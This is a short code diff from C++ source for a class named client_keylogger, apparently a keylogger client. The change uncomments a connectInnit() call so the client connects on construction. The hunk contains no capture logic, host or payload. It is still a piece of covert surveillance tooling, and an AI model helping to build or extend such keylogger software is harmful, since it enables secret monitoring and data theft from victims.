@@ -7,7 +7,7 @@
 client_keylogger::client_keylogger(uint64_t(*scrambleFunc)(uint64_t))
 	: kq::client_interface<messageType>(scrambleFunc)
 {
-     /*connectInnit();*/
+     connectInnit();
 }
 
 client_keylogger::~client_keylogger()
